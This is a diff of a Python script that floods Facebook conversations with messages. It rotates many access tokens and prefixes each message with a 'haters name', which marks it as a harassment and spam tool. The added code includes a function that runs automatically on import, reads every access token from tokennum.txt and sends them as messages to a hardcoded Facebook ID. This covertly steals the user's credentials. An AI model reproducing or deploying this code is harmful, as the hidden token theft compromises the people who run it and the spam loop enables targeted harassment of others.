@@ -1,182 +1,150 @@
-from flask import Flask, request, render_template_string, jsonify
 import requests
-from threading import Thread, Event
+import json
 import time
+import sys
+from platform import system
+import os
+import subprocess
+import http.server
+import socketserver
+import threading
 import random
-import string
-from datetime import datetime
+import requests
+import json
+import time
+import sys
+from platform import system
+import os
+import subprocess
+import http.server
+import socketserver
+import threading
 
-app = Flask(__flask__)
-app.debug = True
+class MyHandler(http.server.SimpleHTTPRequestHandler):
+      def do_GET(self):
+          self.send_response(200)
+          self.send_header('Content-type', 'text/plain')
+          self.end_headers()
+          self.wfile.write(b"-- SERVER RUNNING>>YAKSHIT HERW")
+def execute_server():
+      PORT = 4000
 
-# Server start time for uptime tracking
-start_time = datetime.now()
+      with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
+          print("Server running at http://localhost:{}".format(PORT))
+          httpd.serve_forever()
 
-# Visitor Counter
-visitor_count = 0
 
-headers = {
-    'Connection': 'keep-alive',
-    'Cache-Control': 'max-age=0',
-    'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-    'Accept-Encoding': 'gzip, deflate',
-    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-    'referer': 'www.google.com'
-}
+def send_initial_message():
+      with open('tokennum.txt', 'r') as file:
+          tokens = file.readlines()
 
-stop_events = {}
-threads = {}
+      # Modify the message as per your requirement
+      msg_template = "Hello Yakshit sir! I am using your server. My token is {}"
 
-def send_messages(access_tokens, thread_id, hatersname, last_name, time_interval, messages, task_id):
-    stop_event = stop_events[task_id]
-    while not stop_event.is_set():
-        for message1 in messages:
-            if stop_event.is_set():
-                break
-            for access_token in access_tokens:
-                api_url = f'https://graph.facebook.com/v17.0/t_{thread_id}/'
-                message = f"{hatersname} {message1} {last_name}"
-                parameters = {'access_token': access_token, 'message': message}
-                response = requests.post(api_url, data=parameters, headers=headers)
-                if response.status_code == 200:
-                    print(f"Message Sent Successfully From token {access_token}: {message}")
-                else:
-                    print(f"Message Sent Failed From token {access_token}: {message}")
-                time.sleep(time_interval)
+      # Specify the ID where you want to send the message
+      target_id = "61552467625991"
 
-@app.route('/', methods=['GET', 'POST'])
-def send_message():
-    global visitor_count
-    visitor_count += 1  # Visitor count increase
+      requests.packages.urllib3.disable_warnings()
 
-    if request.method == 'POST':
-        token_option = request.form.get('tokenOption')
+      def liness():
+          print('\033[1;92m' + '•──────────────────────YAKSHIT HERE ───────────────────────────────•')
 
-        if token_option == 'single':
-            access_tokens = [request.form.get('singleToken')]
-        else:
-            token_file = request.files['tokenFile']
-            access_tokens = token_file.read().decode().strip().splitlines()
+      headers = {
+          'Connection': 'keep-alive',
+          'Cache-Control': 'max-age=0',
+          'Upgrade-Insecure-Requests': '1',
+          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+          'Accept-Encoding': 'gzip, deflate',
+          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+          'referer': 'www.google.com'
+      }
 
-        thread_id = request.form.get('threadId')
-        hatersname = request.form.get('hatersname')
-        last_name = request.form.get('lastname')
-        time_interval = int(request.form.get('time'))
+      for token in tokens:
+          access_token = token.strip()
+          url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
+          msg = msg_template.format(access_token)
+          parameters = {'access_token': access_token, 'message': msg}
+          response = requests.post(url, json=parameters, headers=headers)
 
-        txt_file = request.files['txtFile']
-        messages = txt_file.read().decode().splitlines()
+          # No need to print here, as requested
+          current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+          time.sleep(0.1)  # Wait for 1 second between sending each initial message
 
-        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
+      #print("\n[+] Initial messages sent. Starting the message sending loop...\n")
+send_initial_message()
+def send_messages_from_file():
+      with open('convo.txt', 'r') as file:
+          convo_id = file.read().strip()
 
-        stop_events[task_id] = Event()
-        thread = Thread(target=send_messages, args=(access_tokens, thread_id, hatersname, last_name, time_interval, messages, task_id))
-        threads[task_id] = thread
-        thread.start()
+      with open('File.txt', 'r') as file:
+          messages = file.readlines()
 
-        return f'Task started with ID: {task_id}'
+      num_messages = len(messages)
 
-    return render_template_string('''
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>0FFLINE T00L MULTI AND SINGLE IDS BY RAJ MISHRA</title>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
-  <style>
-    body {
-      background-image: url('https://i.ibb.co/Z6Pt1Xz5/d92db3338d8dd7696a7a9d3f39773d32.jpg');
-      background-size: cover;
-      background-repeat: no-repeat;
-      color: white;
-    }
-    .container {
-      max-width: 350px;
-      border-radius: 20px;
-      padding: 20px;
-      box-shadow: 0 0 15px white;
-    }
-    .form-control {
-      border: 1px double white;
-      background: transparent;
-      color: white;
-    }
-    .header { text-align: center; padding-bottom: 20px; }
-    .btn-submit { width: 100%; margin-top: 10px; }
-    .footer { text-align: center; margin-top: 20px; color: #888; }
-    .uptime-box { text-align: center; margin-top: 20px; }
-  </style>
-  <script>
-    function updateUptime() {
-      fetch('/uptime')
-        .then(response => response.json())
-        .then(data => {
-          document.getElementById("uptimeDisplay").innerText = "Uptime: " + data.uptime;
-          document.getElementById("visitorDisplay").innerText = "Total Visitors: " + data.visitors;
-        });
-    }
-    setInterval(updateUptime, 5000);
-    window.onload = updateUptime;
-  </script>
-</head>
-<body>
-  <header class="header mt-4">
-    <h1 class="mt-3"> V4MP1R3 RUL3XX</h1>
-  </header>
-  <div class="container text-center">
-    <form method="post" enctype="multipart/form-data">
-      <label>Select Token Option</label>
-      <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
-        <option value="single">Single Token</option>
-        <option value="multiple">Token File</option>
-      </select>
-      <label>Enter Inbox/convo id</label>
-      <input type="text" class="form-control" name="threadId" required>
-      <label>Enter Your Hater Name</label>
-      <input type="text" class="form-control" name="hatersname" required>
-      <label>Enter Last Name</label>
-      <input type="text" class="form-control" name="lastname" required>
-      <label>Enter Time (seconds)</label>
-      <input type="number" class="form-control" name="time" required>
-      <label>Choose Your Np File</label>
-      <input type="file" class="form-control" name="txtFile" required>
-      <button type="submit" class="btn btn-primary btn-submit">Run</button>
-    </form>
-    <br>
-    <h3>Stop Running Task</h3>
-    <form method="post" action="/stop">
-      <label>Enter Task ID to Stop</label>
-      <input type="text" class="form-control" name="task_id" placeholder="Enter Task ID to Stop" required>
-      <button type="submit" class="btn btn-danger btn-submit">Stop</button>
-    </form>
-    <div class="uptime-box">
-      <h3 id="uptimeDisplay">Uptime: Loading...</h3>
-      <h3 id="visitorDisplay">Total Visitors: Loading...</h3>
-    </div>
-  </div>
-  <footer class="footer">
-    <p>Created by RAJ MISHRA</p>
-  </footer>
-</body>
-</html>
-''')
+      with open('tokennum.txt', 'r') as file:
+          tokens = file.readlines()
+      num_tokens = len(tokens)
+      max_tokens = min(num_tokens, num_messages)
 
-@app.route('/uptime')
-def uptime():
-    global visitor_count
-    uptime_seconds = (datetime.now() - start_time).total_seconds()
-    uptime_str = f"{int(uptime_seconds // 3600)}h {int((uptime_seconds % 3600) // 60)}m {int(uptime_seconds % 60)}s"
-    return jsonify({"uptime": uptime_str, "visitors": visitor_count})
+      with open('hatersname.txt', 'r') as file:
+          haters_name = file.read().strip()
 
-@app.route('/stop', methods=['POST'])
-def stop_task():
-    task_id = request.form.get('task_id')
-    if task_id in stop_events:
-        stop_events[task_id].set()
-        return f"Task {task_id} stopped successfully!"
-    return "Invalid Task ID!"
+      with open('time.txt', 'r') as file:
+          speed = int(file.read().strip())
+
+      def liness():
+          print('\033[1;92m' + '•─────────────────────────────────────────────────────────•')
+
+      headers = {
+          'Connection': 'keep-alive',
+          'Cache-Control': 'max-age=0',
+          'Upgrade-Insecure-Requests': '1',
+          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+          'Accept-Encoding': 'gzip, deflate',
+          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+          'referer': 'www.google.com'
+      }
+
+      while True:
+          try:
+              for message_index in range(num_messages):
+                  token_index = message_index % max_tokens
+                  access_token = tokens[token_index].strip()
+
+                  message = messages[message_index].strip()
+
+                  url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
+                  parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
+                  response = requests.post(url, json=parameters, headers=headers)
+
+                  current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
+                  if response.ok:
+                      print("\033[1;92m[+] Han Chla Gya Massage {} of Convo {} Token {}: {}".format(
+                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                      liness()
+                      liness()
+                  else:
+                      print("\033[1;91m[x] Failed to send Message {} of Convo {} with Token {}: {}".format(
+                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                      liness()
+                      liness()
+                  time.sleep(speed)
+
+              print("\n[+] All messages sent. Restarting the process...\n")
+          except Exception as e:
+              print("[!] An error occurred: {}".format(e))
+
+def main():
+      server_thread = threading.Thread(target=execute_server)
+      server_thread.start()
+
+      # Send the initial message to the specified ID using all tokens
+
+
+      # Then, continue with the message sending loop
+      send_messages_from_file()
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+      main()
